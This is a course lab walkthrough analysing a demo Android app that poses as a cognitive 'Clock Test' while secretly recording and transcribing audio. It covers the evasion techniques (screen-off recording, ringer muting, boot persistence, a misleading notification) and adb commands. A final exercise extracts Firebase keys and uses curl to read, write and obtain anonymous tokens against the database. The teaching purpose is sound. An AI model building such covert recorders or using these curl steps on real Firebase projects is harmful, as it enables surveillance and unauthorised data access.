Hidden Recognition App — Day 3 Capstone

A walkthrough of the spy app that disguises itself as a clock test. The whole drill is about reading the manifest and the runtime behaviour to figure out how a benign-looking questionnaire app records audio in the background, transcribes it, sends it to the cloud, and survives reboots — all while staying within Android's documented platform rules. Slides 2–34 of Hidden Recognition App.pptx.

What you'll learn

  • How an app that has no obvious "spy" hook accumulates the capabilities to spy by composing legitimate Android APIs.
  • Why each runtime / install-time permission in the manifest has a "false reason" the user sees and a "real reason" the developer wants.
  • Why every "few special cases" exception in Google's documentation is a potential capability for a determined developer.
  • How permission, foreground-service type, BOOT_COMPLETED receivers, screen on/off broadcasts, audio-stream muting, and incoming-call detection compose into persistent, silent, and audibly-hidden background recording.
  • Where Android 14/15 finally drew a line the attacker can't cross — and how that line still leaves the rest of the chain intact.
  • The cloud half: Firebase, anonymous auth, security rules, and what a hacker can do with a leaked google-services.json.
  • The defender's checklist — what can a thoughtful user actually inspect to decide whether an app deserves trust?

1. Background — what the app pretends to be vs what it does

The cover story

The lab APK questionnaire.apk presents itself as the "Clock Test" — a cognitive-screening questionnaire with voice features for accessibility. The voice features are real: tap the microphone button on a question and Google's RecognizerIntent activity opens, you speak your answer, the text fills in. Nothing about the foreground UX hints at malicious intent.

The hidden behaviour (slides 4, 9–12, 17–24, 26–28)

While the user is interacting, and after the questionnaire ends, a foreground service runs continuously. It uses the same Google ASR (Automatic Speech Recognition) API but driven from code — no UI, no Google activity in front — and pipes the resulting text into a Firebase real-time database. The service:

  • Lives forever as a foreground service with a notification the developer fully controls (slides 9, 17). The notification text never says "recording your microphone" — Google's "few special cases" exception lets the FGS start as long as it shows some notification (slide 18).
  • Subscribes to ACTION_SCREEN_ON and ACTION_SCREEN_OFF so it only records while the screen is off — the green mic indicator (Android 11+) is hidden because the user can't see the status bar with the screen off (slides 21, 22).
  • Mutes the system STREAM_RING at start so Google's recogniser beep doesn't tip the user off (slide 23). Calls are exempted via a READ_PHONE_STATE listener that detects an incoming call and plays the ringtone manually so the muted ring isn't itself the giveaway (slide 24).
  • Restarts itself after every reboot via a RECEIVE_BOOT_COMPLETED static manifest receiver (slides 12, 19) — one of the few static receivers Google still permits since Android 8.
  • Authenticates anonymously to Firebase, uploads transcripts under the anonymous UID, and is granted INTERNET access "for free" because the bundled Firebase libraries declare that permission themselves (slide 26).

None of these capabilities require a single zero-day or root. Every primitive is published in the Android docs. The novelty is the composition.

3. The two "special cases" (slides 17–18)

Slide 17 ends with: "Apps that target Android 12 or higher can't start foreground services while running in the background, except for a few special cases." Slide 18 expands: this app uses two of those exceptions.

Special caseHow this app triggers it
"Your app transitions from a user-visible state, such as an activity"The questionnaire's last screen ("Get results") starts the recording FGS in its onDestroy / submit handler. From the OS's point of view, an activity that was just visible is permitted to start an FGS — even if the FGS keeps running long after.
"After the device reboots and receives ACTION_BOOT_COMPLETED"The static manifest receiver fires on boot. Until Android 13 this same broadcast was permitted to launch any FGS type — including microphone. From Android 14 this specific path was closed (see section 4).

The notification doesn't have to say what the app really does

The price for the FGS staying alive is a notification — but its text, icon, and dismissibility are decided by the developer. Slide 17 puts it bluntly: "do we really have to say the real reason about why we are here?" The answer is no. The notification can say "Clock Test running" or "Sync in progress" or anything else. The system enforces the presence of a notification, not its honesty.

This is the core of the deception — a permission grant the user gave for one thing is silently used for another, and the FGS notification that exists to tell the user something is happening is allowed to lie about what.

4. BOOT_COMPLETED + the wall the attacker can't bypass (slides 12, 19, 20)

Why the app needs BOOT_COMPLETED

If a phone reboots and the user never re-opens the Clock Test, the recording service would never restart. Persistence depends on receiving the system broadcast that fires once the OS has finished booting and the launcher is up.

Two structural facts make this work:

  • Since Android 8 (API 26), most implicit broadcasts to static manifest receivers are forbidden — Google's stated reason is that one system event would otherwise fan out to every installed app and tank battery.
  • BOOT_COMPLETED is on the small exempted list. A static <receiver> in the manifest with android.intent.action.BOOT_COMPLETED in its intent-filter still fires.

A dynamic (live-context) registration would not have worked: there is no live process for our app at boot, so there's no context to register from. Static manifest registration is what gets us off the ground.

The "stopped state" caveat. Static receivers don't fire until the user has launched the app at least once after install. So the trick depends on the user opening the questionnaire once, which they do (it's the cover story).

The wall: Android 14 and 15 close the BOOT_COMPLETED → microphone-FGS path

From the official Android docs (Behavior changes for apps targeting Android 15):

"Apps that target Android 15 or higher are not allowed to launch a camera/data sync/media playback/media projection/phone call foreground service from a BOOT_COMPLETED broadcast receiver… Apps that target Android 14 or higher are not allowed to launch a microphone foreground service from a BOOT_COMPLETED broadcast receiver."

If the app tries anyway, the system throws ForegroundServiceStartNotAllowedException. Disallowed types on Android 15: dataSync, camera, mediaPlayback, phoneCall, mediaProjection, microphone (microphone has been disallowed since Android 14).

This is the one rule in the chain the attacker cannot compose around. From Android 14, the receiver still fires — it just can't legally start a microphone FGS. The persistence path collapses on every Android-14+ device that targets Android 14+ in its build config. Older API targets still work, which is why the lab demonstrates the trick on a phone running an older API target.

On Android 13 and below the trick is fully effective: every reboot silently restarts the recorder.

Exercise 1 — Find the suspicious bits in the manifest (slide 3)

The slide asks: "Take a look at the clock app's manifest. Does it look suspicious to you? What else do you think it can do?"

Dump the manifest:

aapt2 dump xmltree questionnaire.apk --file AndroidManifest.xml

Identify, in order:

  1. The list of uses-permission entries. Which ones are install-time, which are runtime? For each, write down the false reason a casual reviewer would assume and the real reason from the slides.
  2. The service entries. What does android:foregroundServiceType tell you? Does any service have microphone in there?
  3. The receiver entries. Look for android.intent.action.BOOT_COMPLETED in any intent-filter. What's special about that?
  4. The queries block (Android 11+). Does it mention android.speech.RecognitionService? (Slide 7 says it must, in order to use the Google ASR.)

The full dump is verbose. Useful greps:

aapt2 dump xmltree questionnaire.apk --file AndroidManifest.xml | grep -E 'uses-permission|action android:name|foregroundServiceType|service android:name|receiver android:name'

Exercise 2 — The "we don't really need RECORD_AUDIO" trick (slide 16)

This is a three-stage exercise. The contrast between the stages is the lesson — don't skip stage 1 in a rush to get to the punchline.

Reset the permission state first so stage 1 starts clean. Either reinstall fresh:

adb uninstall com.example.questionaireapp
adb install -r questionnaire.apk        # NOTE: no -g this time

or, if the app is already installed with the permission granted, revoke it explicitly:

adb shell pm revoke com.example.questionaireapp android.permission.RECORD_AUDIO

Confirm RECORD_AUDIO is now granted=false:

adb shell dumpsys package com.example.questionaireapp | grep RECORD_AUDIO

Stage 1 — Open the app normally and deny the permission

Launch without any flag, so the app behaves like a real first-time install:

adb shell am start -n com.example.questionaireapp/.MainActivity
  • The app's questionnaire UI loads.
  • Tap the microphone icon on a question. The app's UI calls Android's runtime-permission API → the system shows the "Allow Questionnaire to record audio?" dialog.
  • Tap Don't allow.
  • Tap the microphone again. Observe what happens. Spoiler: the app's own UI logic refuses to proceed — it sees that checkSelfPermission(RECORD_AUDIO) != GRANTED and bails out, refusing to launch the recogniser.

This is the "expected" behaviour students would predict from any normal Android app: deny the permission, the feature stops working. Note this conclusion. We're about to break it.

Stage 2 — Same denied permission, but bypass the app's own gate

Don't reinstall and don't grant the permission. The app's RECORD_AUDIO is still denied. Force-stop and re-launch with the --ez permission false flag:

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez permission false
  • The app's onCreate reads the boolean extra permission and stores it in a static (PART_A_FAKE_PERMISSION = false).
  • Tap the microphone icon again. This time the app does not check RECORD_AUDIO first — its own permission gate is short-circuited by that flag — and it goes straight to launching Google's full-screen voice-recognition Activity.
  • Speak a few words. Watch the recognised text fill in the answer field.

The recognition just worked, even though our app still has no RECORD_AUDIO permission. Confirm by re-running dumpsys package … | grep RECORD_AUDIO — still granted=false.

Stage 3 — Reflect: where does the contradiction live?

Both runs had the same denied permission. Different outcomes. Why?

Hint 1 — Whose process actually accesses the mic?

When the app launches Google's full-screen recogniser via Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH), the activity that opens, draws the listening UI, and reads the microphone is in Google's app (typically com.google.android.googlequicksearchbox) — a different process with a different UID. Android's permission check resolves against the running process. Google's process holds RECORD_AUDIO at the system level. Our app's permission state is irrelevant on that code path.

Hint 2 — Then why ask for the permission in stage 1?

It's theatre. The app's UI checks RECORD_AUDIO and shows the prompt to look like a normal mic-using app. But the visible feature (the questionnaire's mic button) doesn't actually need the permission, because Google does the work. The user's "yes" gives the developer something they don't need for this code path.

Hint 3 — So why is the permission declared in the manifest at all?

Because of the other code path — the BackgroundVoiceRecognitionService. That service uses SpeechRecognizer.createSpeechRecognizer(this) directly from our process (no Google activity in front). Recording audio from inside our own process does require the calling UID to hold RECORD_AUDIO. The visible-questionnaire prompt is the cover story; the silent-background-recording service is the reason the permission is asked.

The user, looking at the manifest from the outside, sees a single RECORD_AUDIO entry and assumes it's for the questionnaire's mic button — the only mic-related thing they've experienced. The hidden service slips through under that cover.

Hint 4 — What would catch this in a code review?

Two signals together: (a) an app uses RecognizerIntent for a visible feature and (b) the same app declares RECORD_AUDIO directly. The combination is suspicious — if Google's recogniser is doing the visible work, the calling app shouldn't need the permission for itself. A reviewer should ask: "what other mic-using code paths does this app contain?" The answer here is the BackgroundVoiceRecognitionService.

Write your three-stage observation log: what each stage's run did, what each tells you, and a one-sentence summary of why the same denied permission produced different outcomes.

Exercise 3 — The green mic indicator and the "record only when screen off" trick (slides 21–22)

From Android 11, when an app uses the microphone or camera from the background, the system status bar shows a small green indicator (the "privacy indicator"). It can't be hidden by the app — it lives in the system UI. The Hidden Recognition app's defence: never record while the user can see the status bar.

This exercise has two stages. Run them in order so you observe the indicator with and without the protection.

Stage 1 — Default behaviour: no green indicator visible to the user

Complete the questionnaire normally so the FGS starts. Then turn the screen off (power button) and wait. Turn the screen back on. Observe: there is no green indicator in the status bar at the moment you turn the screen on. The mic was off the whole time the screen was off-to-on, and turning it back on triggers the service to stop recording before the indicator can paint.

Open logcat in another terminal so you can correlate:

adb logcat -v time | grep -iE 'recognition|recordAudio|screen|background'

Stage 2 — Disable the screen-off rule and watch the indicator light up

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez screen false

Finish the questionnaire so the FGS starts. Observe: the status bar now shows the green mic indicator while you're using the phone normally. Tap the indicator — Android tells you which app is using the mic (the questionnaire). The whole "we have a perfectly innocent recorder" cover story collapses the moment that indicator is visible.

Hint — Which broadcasts is the service subscribed to, and where is it registered?

Look for ACTION_SCREEN_ON and ACTION_SCREEN_OFF in the decompiled service. They're registered dynamically, with a live Context, from inside BackgroundVoiceRecognitionService.onCreate. Why dynamic and not static? Because Android 8 banned static registration for these high-frequency broadcasts — but a live, already-running service is allowed to receive them. The FGS being alive is what makes this work.

Hint — Why does the indicator paint at all when you turn the screen on in stage 1?

It doesn't. The service receives ACTION_SCREEN_ON at the same moment the user starts seeing the screen, and it stops recognition immediately. The indicator briefly flickers in some Android versions — but on Android 12+ it's effectively imperceptible because the system batches its draw with the screen-on transition.

Stage 3 — Reflect

The privacy indicator is a system-UI countermeasure that the app cannot directly suppress. The bypass isn't about hiding the indicator — it's about ensuring the indicator has nothing to indicate when the user could see it. What does that tell you about the limits of "system-UI" defences against in-process attackers?

Exercise 4 — The recogniser beep, the muted ringer, and the missing call ring (slides 23–24)

Google's SpeechRecognizer emits an unsuppressable beep at the start and end of every recognition session. The Hidden Recognition app handles it by muting STREAM_RING at FGS start. That introduces a side effect: the phone won't ring on incoming calls either. The fix to the side effect is its own piece of plumbing. This exercise walks through both.

Stage 1 — Hear the beep with the mute disabled

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez beep false

Finish the questionnaire so the FGS starts and begins recording sessions. Lock the screen, wait, then talk near the phone. Listen. You should hear the recogniser's start beep right after each ACTION_SCREEN_OFF trigger and another beep when it stops.

This is the audible signature of the attack. With beep=true (the default), this beep is muted — the user has no audible cue that the mic is on.

Stage 2 — Restore the default and verify the beep is gone

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity         # default — beep=true (muted)

Repeat the listen test. No beep. Verify the system rang volume is now zero while the service runs:

adb shell media volume --get --stream 2     # STREAM_RING (Android docs: stream id 2)

Stage 3 — Discover the side effect: incoming calls don't ring

With the default running (FGS up, ring muted, screen off), have someone call the phone. Observe: if you toggle --ez call false (disabling the incoming-call handler), the phone does not ring. The display lights up but no audible ringtone plays — the user might miss the call entirely. This would be the giveaway: a phone that goes silent on calls.

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez call false

Stage 4 — Re-enable the call handler and see how the spy app papers over the side effect

Default (call=true path active): place an incoming call again. Observe: the phone rings. But the ring isn't really the system ringtone in the normal way — it's the app, having detected the incoming call via its PhoneStateListener on READ_PHONE_STATE, playing the user's default ringtone manually via RingtoneManager (slide 24). Why manually?

Hint — Why not just un-mute STREAM_RING when the call comes in?

Because by the time onCallStateChanged(RINGING) fires in our process, the system has already started its silent ring (STREAM_RING is at zero). Raising the volume mid-ring doesn't retroactively make the first ring audible — and the first second of silence is already audible to the caller as a "voicemail-likely" cue. Slide 24 says the volume increase was "too late". The workaround is to play the ringtone ourselves the moment the listener fires, then restore the mute when the call state goes back to IDLE.

Hint — What's the cover story for asking READ_PHONE_STATE?

"To pause voice features during a call." It's plausible enough that most users tap "Allow" without thinking. The real reason is patching the side effect of the previous trick. Slide 24 ends with: "Can we think of any excuse to ask for it?" — that is the entire problem of runtime-permission consent surfaces. The user is asked one question and gives one answer; they have no view into the chain of unrelated capabilities that answer composes into.

Stage 5 — Reflect

This exercise is two layered defences (mute the beep, restore the ring) for the same single attacker goal (audibly hide the recording). Each layer adds another permission to the manifest. From the user's point of view, the manifest grows; from the developer's point of view, each addition is "necessary plumbing for the previous layer". That ratchet is how a benign-looking app accumulates a frightening permission set without any single grant feeling unjustified.

Exercise 5 — The cloud half: Firebase rules and the google-services.json hijack (slides 26–28)

Slide 28 calls Firebase rules the project's weak spot: an app that ships its google-services.json with open rules effectively ships database credentials inside the APK. This exercise extracts those credentials from the lab APK and uses them to access the database from outside the app — proving the point that a leaked or extracted google-services.json + permissive rules = whole database in the attacker's hands.

Stage 1 — Pull Firebase config out of the APK

Firebase config doesn't ship as a separate google-services.json file in the APK; the Gradle plugin compiles its values into res/values/strings.xml at build time. Dump them:

aapt2 dump strings questionnaire.apk | grep -E 'AIza|firebaseio|firebasestorage|^[Ss]tring #1[0-9]+ : 1:[0-9]+:android:'

Identify the four interesting fields:

  • google_api_key — the public web API key (begins with AIza...)
  • google_app_id — the per-platform app id (format 1:<sender>:android:<hash>)
  • gcm_defaultSenderId — the project number
  • project_id — the human-readable project name (here: questionairapp)

From the project_id alone you can construct the Realtime Database URL:

https://<project_id>-default-rtdb.firebaseio.com/

Stage 2 — Test the rules

Append .json to any path of the database and curl it with no auth header. The response tells you the rules state:

# on lab/student PC:
curl -sS -w '\nHTTP %{http_code}\n' "https://questionairapp-default-rtdb.firebaseio.com/.json"

Expected outcomes:

ResponseRules state
HTTP 200 + JSON dump of the entire databaseRules are ".read": true — anyone can read everything.
HTTP 401 + "Permission denied"Rules require auth (auth != null) or are false.

Then test write:

curl -sS -X POST -d '{"injection":"test"}' \
  "https://questionairapp-default-rtdb.firebaseio.com/test.json"

If this returns HTTP 200 with a Firebase-generated key, write rules are also wide open — anyone with the project_id can pollute, overwrite, or delete data.

Stage 3 — Anonymous-auth bypass (if rules require auth != null)

The app authenticates anonymously (slide 27). If the rules are "auth != null" — a common "looks safer than true" choice — anyone can replay that anonymous-sign-in flow against the public Identity Toolkit using the API key from the APK:

# sign in anonymously, no app needed:
curl -sS -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -H 'Content-Type: application/json' \
  -d '{"returnSecureToken":true}'

# returned 'idToken' is now a valid auth token — read with it:
curl -sS "https://<project_id>-default-rtdb.firebaseio.com/.json?auth=<idToken>"

An "auth != null" rule keeps random scanners out for about thirty seconds. Anyone who can extract the API key from any installed APK passes that bar.

Stage 4 — What the only-real fix looks like

Hint — What are the actual safe Firebase rule shapes?

Three shapes scale from least to most safe:

  1. Per-user partitioning: ".read": "auth.uid === $uid", ".write": "auth.uid === $uid" with the database tree scoped under /users/$uid/.... A signed-in user can only read/write their own subtree. Stops cross-user leaks but doesn't stop one bad user.
  2. Server-mediated: rules set to false at the root, with all reads/writes performed by Cloud Functions or your own backend service that holds the Firebase admin SDK. The client never touches the DB directly. Slowest to develop, most defensible.
  3. App Check: Firebase App Check binds requests to a verified app instance (Play Integrity / DeviceCheck token). Combined with the above, it raises the bar from "anyone with the API key" to "anyone running an unmodified copy of your real app".

Slide 28 mentions "embed credentials in a binary library and load at runtime" — that's obfuscation, not a fix. With JADX or Frida, every embedded credential in an APK is recoverable. App Check is the real answer.

Stage 5 — Reflect

  1. The google-services.json values are not "secrets" in the traditional sense — Google's own docs describe them as identifiers, not credentials. What does it tell you about Firebase's threat model that the entire database can be owned by someone holding only "identifiers"?
  2. If you ship an Android app that uses Firebase, what's the smallest set of operational habits (review-board, tooling, CI checks) that would catch open rules before release?
  3. The Hidden Recognition app uploads transcripts. If you were responsible for incident response on a leak like this, in what order would you contact users, rotate keys, and migrate data — and what would Firebase's response be at each step?
